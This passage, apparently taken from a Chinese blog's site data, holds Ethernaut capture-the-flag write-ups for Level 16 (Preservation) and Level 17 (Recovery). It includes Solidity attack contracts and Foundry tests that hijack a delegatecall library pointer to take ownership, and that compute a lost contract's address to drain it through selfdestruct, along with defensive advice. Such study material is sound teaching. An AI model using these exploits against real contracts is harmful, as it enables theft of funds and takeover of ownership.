挑战目标</h2><p>本关的目标是获取 <code>Preservation</code> 合约的所有权，即成为该合约的 <code>owner</code>。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel16.svg\" alt=\"Preservation Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p><code>Preservation</code> 合约的 <code>owner</code> 是私有的，并且没有直接的函数来修改它。漏洞隐藏在使用 <code>delegatecall</code> 的 <code>setFirstTime</code> 和 <code>setSecondTime</code> 函数中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Preservation &#123;</span><br><span class=\"line\">    address public timeZone1Library;</span><br><span class=\"line\">    address public timeZone2Library;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    uint storedTime;</span><br><span class=\"line\"></span><br><span class=\"line\">    // ... constructor ...</span><br><span class=\"line\"></span><br><span class=\"line\">    function setFirstTime(uint _timeStamp) public &#123;</span><br><span class=\"line\">        timeZone1Library.delegatecall(abi.encodePacked(bytes4(keccak256(&quot;setTime(uint256)&quot;)), _timeStamp));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setSecondTime(uint _timeStamp) public &#123;</span><br><span class=\"line\">        timeZone2Library.delegatecall(abi.encodePacked(bytes4(keccak256(&quot;setTime(uint256)&quot;)), _timeStamp));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>delegatecall</code> 是一个非常危险的操作码。它会在调用者合约的上下文中执行另一个合约的代码。这意味着，被调用合约（<code>library</code>）的代码可以修改调用者合约（<code>Preservation</code>）的存储。</p>\n<p>当 <code>setFirstTime</code> 通过 <code>delegatecall</code> 调用 <code>timeZone1Library</code> 的 <code>setTime</code> 函数时，<code>setTime</code> 函数修改的存储槽位是 <code>Preservation</code> 合约的槽位。</p>\n<p>让我们比较一下 <code>Preservation</code> 和 <code>LibraryContract</code> 的存储布局：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Slot</th>\n<th align=\"left\"><code>Preservation</code> 合约</th>\n<th align=\"left\"><code>LibraryContract</code> 合约</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">0</td>\n<td align=\"left\"><code>timeZone1Library</code></td>\n<td align=\"left\"><code>storedTime</code></td>\n</tr>\n<tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><code>timeZone2Library</code></td>\n<td align=\"left\">(未使用)</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\"><code>owner</code></td>\n<td align=\"left\">(未使用)</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\"><code>storedTime</code></td>\n<td align=\"left\">(未使用)</td>\n</tr>\n</tbody></table>\n<p>当 <code>LibraryContract.setTime(uint)</code> 被 <code>delegatecall</code> 调用时，它以为自己在修改 <code>storedTime</code>（位于 slot 0）。但实际上，它修改的是 <code>Preservation</code> 合约的 slot 0，也就是 <code>timeZone1Library</code> 的地址！</p>\n<p>这就给了我们一个攻击路径：</p>\n<ol>\n<li><strong>第一次调用 <code>setFirstTime</code></strong>: 我们传入一个精心构造的 <code>_timeStamp</code>，这个 <code>_timeStamp</code> 其实是我们的攻击合约的地址。这次调用会把 <code>Preservation</code> 合约的 <code>timeZone1Library</code> (slot 0) 修改为我们的攻击合约地址。</li>\n<li><strong>创建攻击合约</strong>: 我们的攻击合约需要有一个 <code>setTime(uint)</code> 函数。但是，这个函数的实现不是为了设置时间，而是为了修改 <code>owner</code>。为了能修改 <code>owner</code>（位于 slot 2），我们的攻击合约需要有与 <code>Preservation</code> 相似的存储布局，使得 <code>owner</code> 变量也位于 slot 2。</li>\n<li><strong>第二次调用 <code>setFirstTime</code></strong>: 现在 <code>timeZone1Library</code> 已经指向我们的攻击合约。我们再次调用 <code>setFirstTime</code>，这次传入我们自己的地址（<code>player</code>）作为 <code>_timeStamp</code>。<code>delegatecall</code> 会执行我们攻击合约的 <code>setTime</code> 函数，该函数会将传入的 <code>_timeStamp</code> (我们的地址) 写入 <code>owner</code> 变量（slot 2），从而使我们成为 <code>owner</code>。</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><p>攻击合约的存储布局必须与 <code>Preservation</code> 兼容，至少在前三个槽位上是这样。它的 <code>setTime</code> 函数被设计用来修改 <code>owner</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">// 攻击合约</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    // 保持与 Preservation 合约相同的存储布局</span><br><span class=\"line\">    address public timeZone1Library;</span><br><span class=\"line\">    address public timeZone2Library;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 这个函数签名必须与库函数匹配</span><br><span class=\"line\">    // 但实现是恶意的</span><br><span class=\"line\">    function setTime(uint256 _newOwner) public &#123;</span><br><span class=\"line\">        // 当被 delegatecall 调用时，它会修改 Preservation 合约的 slot 2</span><br><span class=\"line\">        owner = address(uint160(_newOwner));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/16_Preservation.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 攻击合约定义 (同上)</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    address public timeZone1Library;</span><br><span class=\"line\">    address public timeZone2Library;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    function setTime(uint256 _newOwner) public &#123; owner = address(uint160(_newOwner)); &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PreservationTest is Test &#123;</span><br><span class=\"line\">    Preservation instance;</span><br><span class=\"line\">    Attack attackContract;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署目标合约和攻击合约</span><br><span class=\"line\">        LibraryContract lib = new LibraryContract();</span><br><span class=\"line\">        instance = new Preservation(address(lib), address(lib));</span><br><span class=\"line\">        attackContract = new Attack();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player, player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 步骤 1: 将 timeZone1Library (slot 0) 修改为攻击合约的地址</span><br><span class=\"line\">        instance.setFirstTime(uint256(uint160(address(attackContract))));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证 timeZone1Library 是否已更改</span><br><span class=\"line\">        assertEq(instance.timeZone1Library(), address(attackContract));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 步骤 2: 再次调用 setFirstTime，这次会执行攻击合约的 setTime 函数</span><br><span class=\"line\">        // 将 owner (slot 2) 修改为 player 的地址</span><br><span class=\"line\">        instance.setFirstTime(uint256(uint160(player)));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证 owner 是否已更改</span><br><span class=\"line\">        assertEq(instance.owner(), player);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>部署攻击合约</strong>: 创建一个具有恶意 <code>setTime</code> 函数和兼容存储布局的攻击合约。</li>\n<li><strong>第一次 <code>setFirstTime</code> 调用</strong>: 调用 <code>setFirstTime</code>，参数为攻击合约的地址。这会劫持 <code>timeZone1Library</code> 指针。</li>\n<li><strong>第二次 <code>setFirstTime</code> 调用</strong>: 再次调用 <code>setFirstTime</code>，参数为 <code>player</code> 的地址。这会执行攻击合约的代码，将 <code>player</code> 的地址写入 <code>Preservation</code> 合约的 <code>owner</code> 存储槽。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><strong>使用 <code>library</code> 关键字</strong>: Solidity 的 <code>library</code> 类型是专门为此类功能设计的。库是无状态的，并且不能被 <code>delegatecall</code> 直接调用来修改状态（除非使用了特定的技巧）。它们可以防止存储布局冲突。</li>\n<li><strong>确保兼容的存储布局</strong>: 如果你必须使用 <code>delegatecall</code> 到一个非库合约，请务必确保两个合约具有完全相同且兼容的存储布局。任何差异都可能导致严重的安全漏洞。</li>\n<li><strong>不要将 <code>delegatecall</code> 暴露给用户输入</strong>: 避免让用户控制 <code>delegatecall</code> 的目标地址或参数。<code>delegatecall</code> 应该只用于与受信任和经过验证的代码进行交互。</li>\n<li><strong>使用 <code>call</code> 而不是 <code>delegatecall</code></strong>: 如果只是想调用另一个合约的函数，而不需要在当前合约的上下文中执行，请使用标准的 <code>call</code>。<code>call</code> 会在被调用合约自己的上下文中执行，不会影响调用者的存储。</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong><code>delegatecall</code></strong>: EVM 中最强大的操作码之一，也是最危险的。它允许代码重用，但也带来了存储操纵的风险。</li>\n<li><strong>存储布局 (Storage Layout)</strong>: 理解Solidity如何将变量存储在EVM的存储槽中是高级智能合约安全分析的基础。<code>forge inspect &lt;Contract&gt; storage-layout</code> 是一个非常有用的工具。</li>\n<li><strong>类型转换</strong>: 将 <code>address</code> 转换为 <code>uint</code> 是本次攻击的关键。<code>uint256(uint160(address))</code> 是实现这一点的标准方法。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li><code>delegatecall</code> 在调用者的上下文中执行代码，这意味着它可以修改调用者的存储。</li>\n<li>当调用者和被调用者的存储布局不匹配时，<code>delegatecall</code> 会导致意想不到的、灾难性的状态损坏。</li>\n<li>合约的存储槽是按顺序分配的，了解这个顺序是预测 <code>delegatecall</code> 影响的关键。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>利用 <code>delegatecall</code> 和不匹配的存储布局来覆盖合约的关键状态变量（如指针或所有者地址）。</li>\n<li>通过两步攻击，首先劫持代码执行流（通过覆盖库地址），然后执行恶意代码来获取权限。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>严格限制 <code>delegatecall</code> 的使用。</li>\n<li>优先使用 <code>library</code> 关键字来创建无状态的辅助合约。</li>\n<li>确保 <code>delegatecall</code> 的目标合约具有兼容的存储布局。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#delegatecall-callcode-and-libraries\">Solidity Docs: Delegatecall &#x2F; Callcode and Libraries</a></li>\n<li><a href=\"https://consensys.net/diligence/blog/2019/09/delegatecall-gotchas/\">Consensys: Delegatecall Vulnerabilities</a></li>\n</ul>\n"},{"title":"Ethernaut Level 17: Recovery - 预测合约地址","date":"2025-01-25T08:30:00.000Z","updated":"2025-01-25T08:30:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"学习如何基于部署者地址和 nonce 确定性地计算未来合约的地址。深入理解以太坊的 RLP 编码规则和 `keccak256` 哈希在地址生成中的作用，掌握 Recovery 关卡的破解技巧。","_content":"\n# 🎯 Ethernaut Level 17: Recovery - 预测合约地址\n\n> **关卡链接**: [Ethernaut Level 17 - Recovery](https://ethernaut.openzeppelin.com/level/17)  \n> **攻击类型**: 合约地址预测  \n> **难度**: ⭐⭐⭐☆☆\n\n## 📋 挑战目标\n\n`Recovery` 合约通过 `generateToken` 函数创建了一个 `SimpleToken` 合约实例，并向其发送了 0.001 ether。但是，`generateToken` 函数没有返回新创建的合约地址。你的目标是取回这 0.001 ether。\n\n![Recovery Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel17.svg)\n\n## 🔍 漏洞分析\n\n`SimpleToken` 合约中有一个 `destroy` 函数，可以销毁合约并将余额发送到指定地址。因此，本关的核心挑战在于找到这个丢失的 `SimpleToken` 合约的地址。\n\n```solidity\ncontract SimpleToken {\n    // ...\n    function destroy(address payable _to) public {\n        selfdestruct(_to);\n    }\n}\n```\n\n在以太坊中，合约的地址并不是随机的，而是可以根据部署者的地址和其 `nonce` 确定性地计算出来的。其计算公式为：\n\n`new_address = keccak256(rlp([sender_address, nonce]))`\n\n-   `sender_address`: 创建合约的账户地址。在本例中，是 `Recovery` 合约的地址。\n-   `nonce`: 创建者账户的 `nonce`。对于EOA，`nonce` 是其发送的交易数量。对于合约，`nonce` 是它创建的合约数量。由于 `Recovery` 合约是第一次创建 `SimpleToken`，所以它的 `nonce` 是1。\n-   `rlp([...])`: 对发送者地址和 `nonce` 进行RLP（Recursive-Length Prefix）编码。\n\n### RLP 编码\n\nRLP编码规则比较复杂，但对于 `[address, nonce]` 这种列表，我们可以简化其在Solidity中的构造：\n\n`abi.encodePacked(byte(0xd6), byte(0x94), sender_address, byte(0x01))`\n\n-   `0xd6`: RLP前缀，表示一个长度在0-55字节之间的列表（list）。\n-   `0x94`: RLP前缀，表示一个20字节的字符串（string），即地址。\n-   `sender_address`: 20字节的部署者地址。\n-   `0x01`: `nonce` 为1的RLP编码。\n\n将这些部分打包并进行 `keccak256` 哈希，然后取结果的后20字节，就是我们丢失的合约地址。\n\n### 在Solidity中计算地址\n\n我们可以编写一个简单的函数来执行这个计算：\n\n```solidity\nfunction calculateAddress(address _deployerAddress) public pure returns (address) {\n    uint nonce = 1; // 这是 _deployerAddress 创建的第一个合约\n    return address(\n        uint160(\n            uint256(\n                keccak256(\n                    abi.encodePacked(\n                        bytes1(0xd6),\n                        bytes1(0x94),\n                        _deployerAddress,\n                        bytes1(nonce)\n                    )\n                )\n            )\n        )\n    );\n}\n```\n\n一旦我们计算出 `SimpleToken` 的地址，我们就可以调用它的 `destroy` 函数来取回以太币。\n\n## 💻 Foundry 实现\n\n### 攻击合约/逻辑\n\n我们可以创建一个 `Attack` 合约，其中包含一个函数来为我们计算丢失的合约地址。\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Attack {\n    function calculate(address _deployerAddress) public pure returns (address) {\n        // nonce 是 1，因为这是 _deployerAddress 创建的第一个合约\n        bytes1 nonce = bytes1(0x01);\n\n        address lostContractAddress = address(\n            uint160(\n                uint256(\n                    keccak256(\n                        abi.encodePacked(\n                            bytes1(0xd6),       // RLP prefix for a list\n                            bytes1(0x94),       // RLP prefix for a 20-byte string\n                            _deployerAddress,   // The deployer's address\n                            nonce             // The nonce\n                        )\n                    )\n                )\n            )\n        );\n\n        return lostContractAddress;\n    }\n}\n```\n\n### Foundry 测试代码\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/17_Recovery.sol\";\n\n// 攻击合约定义 (同上)\ncontract Attack {\n    function calculate(address _deployerAddress) public pure returns (address) {\n        bytes1 nonce = bytes1(0x01);\n        address lostContractAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _deployerAddress, nonce)))));\n        return lostContractAddress;\n    }\n}\n\ncontract RecoveryTest is Test {\n    Recovery recoveryInstance;\n    Attack attack;\n    address payable player;\n\n    function setUp() public {\n        player = payable(vm.addr(1));\n        \n        // 部署 Recovery 合约并让它创建一个 SimpleToken\n        vm.deal(address(this), 0.001 ether);\n        recoveryInstance = new Recovery();\n        recoveryInstance.generateToken{value: 0.001 ether}(\"MyToken\", 100);\n\n        attack = new Attack();\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player, player);\n\n        // 步骤 1: 计算丢失的 SimpleToken 合约地址\n        address payable lostContract = payable(attack.calculate(address(recoveryInstance)));\n\n        // 验证余额是否正确\n        assertEq(lostContract.balance, 0.001 ether);\n\n        // 步骤 2: 调用 destroy 函数取回资金\n        SimpleToken(lostContract).destroy(player);\n\n        // 验证资金是否已取回\n        assertEq(lostContract.balance, 0);\n        // 注意: player 的最终余额会略低于初始值，因为有 gas 消耗\n\n        vm.stopPrank();\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **获取部署者地址**: 确定创建 `SimpleToken` 的合约地址，即 `Recovery` 合约的地址。\n2.  **计算合约地址**: 使用 `keccak256(rlp([deployer_address, nonce]))` 公式计算出 `SimpleToken` 的地址。`nonce` 为1。\n3.  **调用 `destroy`**: 获取 `SimpleToken` 合约的实例，并调用其 `destroy` 函数，将资金转移到 `player` 地址。\n\n## 🛡️ 防御措施\n\n1.  **返回创建的合约地址**: 工厂合约在创建新合约时，应该总是返回新创建的合约地址，或者触发一个包含该地址的事件。这是一个良好的编程实践。\n\n    ```solidity\n    // 修复建议\n    function generateToken(string memory _name, uint256 _initialSupply) public payable returns (address) {\n        SimpleToken token = new SimpleToken(_name, _initialSupply);\n        token.transfer(msg.sender, msg.value);\n        emit TokenCreated(address(token)); // 触发事件\n        return address(token); // 返回地址\n    }\n    ```\n\n2.  **使用 `CREATE2`**: 如果需要更强的地址确定性（例如，在合约部署前就与其交互），可以使用 `CREATE2` 操作码。`CREATE2` 允许根据部署者地址、一个 `salt` 值和合约的初始化代码来预计算地址，提供了更大的灵活性。\n\n## 🔧 相关工具和技术\n\n-   **地址确定性计算**: 理解合约地址是如何从部署者地址和 `nonce` 生成的，是EVM的一个核心概念。\n-   **RLP (Recursive-Length Prefix)**: 以太坊用于序列化对象的主要编码方法。虽然在高级Solidity编程中不常直接使用，但理解其基本原理有助于深入了解EVM的内部工作方式。\n-   **`keccak256`**: 以太坊中无处不在的哈希函数，用于地址生成、函数签名、数据校验等多种场景。\n\n## 🎯 总结\n\n**核心概念**:\n-   合约地址是确定性的，可以预先计算。\n-   地址的计算依赖于部署者的地址和其 `nonce`。\n-   RLP编码是以太坊序列化数据的基础。\n\n**攻击向量**:\n-   当工厂合约没有返回或记录其创建的子合约地址时，攻击者可以通过链上数据（部署者地址和 `nonce`）自行计算出该地址。\n-   一旦找到地址，就可以与该合约进行交互，利用其内部的任何函数（如本例中的 `destroy`）。\n\n**防御策略**:\n-   工厂合约应始终通过返回值或事件来暴露其创建的子合约地址。\n-   在设计合约时，遵循良好的编程实践，确保所有重要的信息都是可访问的。\n\n## 📚 参考资料\n\n-   [EIP-20: Contract Address Calculation](https://eips.ethereum.org/EIPS/eip-20)\n-   [Ethereum Docs: RLP (Recursive-Length Prefix)](https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/)\n-   [StackExchange: How is an Ethereum address created?](https://ethereum.stackexchange.com/questions/760/how-is-an-ethereum-address-created)","source":"_posts/ethernaut-level-17-recovery.md","raw":"---\ntitle: 'Ethernaut Level 17: Recovery - 预测合约地址'\ndate: 2025-01-25 16:30:00\nupdated: 2025-01-25 16:30:00\ncategories:\n  - Ethernaut 系列\n  - 进阶攻击篇 (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - Contract Address Prediction\n  - RLP\n  - keccak256\n  - 智能合约安全\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"学习如何基于部署者地址和 nonce 确定性地计算未来合约的地址。深入理解以太坊的 RLP 编码规则和 `keccak256` 哈希在地址生成中的作用，掌握 Recovery 关卡的破解技巧。\"\n---\n\n# 🎯 Ethernaut Level 17: Recovery - 预测合约地址\n\n> **关卡链接**: [Ethernaut Level 17 - Recovery](https://ethernaut.openzeppelin.com/level/17)  \n> **攻击类型**: 合约地址预测  \n> **难度**: ⭐⭐⭐☆☆\n\n## 📋 挑战目标\n\n`Recovery` 合约通过 `generateToken` 函数创建了一个 `SimpleToken` 合约实例，并向其发送了 0.001 ether。但是，`generateToken` 函数没有返回新创建的合约地址。你的目标是取回这 0.001 ether。\n\n![Recovery Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel17.svg)\n\n## 🔍 漏洞分析\n\n`SimpleToken` 合约中有一个 `destroy` 函数，可以销毁合约并将余额发送到指定地址。因此，本关的核心挑战在于找到这个丢失的 `SimpleToken` 合约的地址。\n\n```solidity\ncontract SimpleToken {\n    // ...\n    function destroy(address payable _to) public {\n        selfdestruct(_to);\n    }\n}\n```\n\n在以太坊中，合约的地址并不是随机的，而是可以根据部署者的地址和其 `nonce` 确定性地计算出来的。其计算公式为：\n\n`new_address = keccak256(rlp([sender_address, nonce]))`\n\n-   `sender_address`: 创建合约的账户地址。在本例中，是 `Recovery` 合约的地址。\n-   `nonce`: 创建者账户的 `nonce`。对于EOA，`nonce` 是其发送的交易数量。对于合约，`nonce` 是它创建的合约数量。由于 `Recovery` 合约是第一次创建 `SimpleToken`，所以它的 `nonce` 是1。\n-   `rlp([...])`: 对发送者地址和 `nonce` 进行RLP（Recursive-Length Prefix）编码。\n\n### RLP 编码\n\nRLP编码规则比较复杂，但对于 `[address, nonce]` 这种列表，我们可以简化其在Solidity中的构造：\n\n`abi.encodePacked(byte(0xd6), byte(0x94), sender_address, byte(0x01))`\n\n-   `0xd6`: RLP前缀，表示一个长度在0-55字节之间的列表（list）。\n-   `0x94`: RLP前缀，表示一个20字节的字符串（string），即地址。\n-   `sender_address`: 20字节的部署者地址。\n-   `0x01`: `nonce` 为1的RLP编码。\n\n将这些部分打包并进行 `keccak256` 哈希，然后取结果的后20字节，就是我们丢失的合约地址。\n\n### 在Solidity中计算地址\n\n我们可以编写一个简单的函数来执行这个计算：\n\n```solidity\nfunction calculateAddress(address _deployerAddress) public pure returns (address) {\n    uint nonce = 1; // 这是 _deployerAddress 创建的第一个合约\n    return address(\n        uint160(\n            uint256(\n                keccak256(\n                    abi.encodePacked(\n                        bytes1(0xd6),\n                        bytes1(0x94),\n                        _deployerAddress,\n                        bytes1(nonce)\n                    )\n                )\n            )\n        )\n    );\n}\n```\n\n一旦我们计算出 `SimpleToken` 的地址，我们就可以调用它的 `destroy` 函数来取回以太币。\n\n## 💻 Foundry 实现\n\n### 攻击合约/逻辑\n\n我们可以创建一个 `Attack` 合约，其中包含一个函数来为我们计算丢失的合约地址。\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Attack {\n    function calculate(address _deployerAddress) public pure returns (address) {\n        // nonce 是 1，因为这是 _deployerAddress 创建的第一个合约\n        bytes1 nonce = bytes1(0x01);\n\n        address lostContractAddress = address(\n            uint160(\n                uint256(\n                    keccak256(\n                        abi.encodePacked(\n                            bytes1(0xd6),       // RLP prefix for a list\n                            bytes1(0x94),       // RLP prefix for a 20-byte string\n                            _deployerAddress,   // The deployer's address\n                            nonce             // The nonce\n                        )\n                    )\n                )\n            )\n        );\n\n        return lostContractAddress;\n    }\n}\n```\n\n### Foundry 测试代码\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/17_Recovery.sol\";\n\n// 攻击合约定义 (同上)\ncontract Attack {\n    function calculate(address _deployerAddress) public pure returns (address) {\n        bytes1 nonce = bytes1(0x01);\n        address lostContractAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _deployerAddress, nonce)))));\n        return lostContractAddress;\n    }\n}\n\ncontract RecoveryTest is Test {\n    Recovery recoveryInstance;\n    Attack attack;\n    address payable player;\n\n    function setUp() public {\n        player = payable(vm.addr(1));\n        \n        // 部署 Recovery 合约并让它创建一个 SimpleToken\n        vm.deal(address(this), 0.001 ether);\n        recoveryInstance = new Recovery();\n        recoveryInstance.generateToken{value: 0.001 ether}(\"MyToken\", 100);\n\n        attack = new Attack();\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player, player);\n\n        // 步骤 1: 计算丢失的 SimpleToken 合约地址\n        address payable lostContract = payable(attack.calculate(address(recoveryInstance)));\n\n        // 验证余额是否正确\n        assertEq(lostContract.balance, 0.001 ether);\n\n        // 步骤 2: 调用 destroy 函数取回资金\n        SimpleToken(lostContract).destroy(player);\n\n        // 验证资金是否已取回\n        assertEq(lostContract.balance, 0);\n        // 注意: player 的最终余额会略低于初始值，因为有 gas 消耗\n\n        vm.stopPrank();\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **获取部署者地址**: 确定创建 `SimpleToken` 的合约地址，即 `Recovery` 合约的地址。\n2.  **计算合约地址**: 使用 `keccak256(rlp([deployer_address, nonce]))` 公式计算出 `SimpleToken` 的地址。`nonce` 为1。\n3.  **调用 `destroy`**: 获取 `SimpleToken` 合约的实例，并调用其 `destroy` 函数，将资金转移到 `player` 地址。\n\n## 🛡️ 防御措施\n\n1.  **返回创建的合约地址**: 工厂合约在创建新合约时，应该总是返回新创建的合约地址，或者触发一个包含该地址的事件。这是一个良好的编程实践。\n\n    ```solidity\n    // 修复建议\n    function generateToken(string memory _name, uint256 _initialSupply) public payable returns (address) {\n        SimpleToken token = new SimpleToken(_name, _initialSupply);\n        token.transfer(msg.sender, msg.value);\n        emit TokenCreated(address(token)); // 触发事件\n        return address(token); // 返回地址\n    }\n    ```\n\n2.  **使用 `CREATE2`**: 如果需要更强的地址确定性（例如，在合约部署前就与其交互），可以使用 `CREATE2` 操作码。`CREATE2` 允许根据部署者地址、一个 `salt` 值和合约的初始化代码来预计算地址，提供了更大的灵活性。\n\n## 🔧 相关工具和技术\n\n-   **地址确定性计算**: 理解合约地址是如何从部署者地址和 `nonce` 生成的，是EVM的一个核心概念。\n-   **RLP (Recursive-Length Prefix)**: 以太坊用于序列化对象的主要编码方法。虽然在高级Solidity编程中不常直接使用，但理解其基本原理有助于深入了解EVM的内部工作方式。\n-   **`keccak256`**: 以太坊中无处不在的哈希函数，用于地址生成、函数签名、数据校验等多种场景。\n\n## 🎯 总结\n\n**核心概念**:\n-   合约地址是确定性的，可以预先计算。\n-   地址的计算依赖于部署者的地址和其 `nonce`。\n-   RLP编码是以太坊序列化数据的基础。\n\n**攻击向量**:\n-   当工厂合约没有返回或记录其创建的子合约地址时，攻击者可以通过链上数据（部署者地址和 `nonce`）自行计算出该地址。\n-   